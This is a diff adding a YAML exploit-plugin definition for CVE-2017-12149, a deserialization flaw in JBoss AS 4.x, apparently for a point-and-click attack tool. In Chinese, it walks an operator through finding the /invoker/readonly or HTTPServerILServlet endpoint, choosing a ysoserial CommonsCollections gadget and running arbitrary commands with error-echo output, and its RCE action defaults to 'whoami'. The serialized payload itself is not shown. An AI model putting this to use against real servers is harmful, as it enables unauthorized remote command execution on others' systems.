@@ -1,0 +1,39 @@
+info:
+    app: Jboss
+    name: CVE-2017-12149
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2017-08-01"
+    create_date: "2024-10-06 07:47:52"
+    update_date: "2024-10-06 07:47:52"
+    scope: JBoss AS 4.x及之前版本
+    description: |-
+        1. 确认目标是否存在/invoker/readonly路径。
+        2. 设置URL为http://x.x.x.x:8084或http://x.x.x.x:8084/invoker/readonly
+        2. 选择ysoserial的gadget，推荐使用CommonsCollectionsK1，对应版本commons-collections:3.1、3.2.1
+        3. 输入命令执行即可。
+        报错回显
+    vul_id: CVE-2017-12149
+    detail: |-
+        1. 确认目标是否存在/jbossmq-httpil/HTTPServerILServlet 路径。
+        2. 设置URL为http://x.x.x.x:8084或http://x.x.x.x:8084/jbossmq-httpil/HTTPServerILServlet
+        2. 选择ysoserial的gadget，推荐使用CommonsCollectionsK1，对应版本commons-collections:3.2.1
+        3. 输入命令执行即可。
+        报错回显
+    payload: POST提交的body部分为序列化对象，不可读
+payloads:
+    - name: cmd1
+      alias: RCE
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
+          - key: gadget
+            title: Gadget
+            param_type: combobox
+            default_value:
+                - CommonsCollectionsK1ErrorEcho
+                - CommonsCollectionsK2ErrorEcho
+            required: true
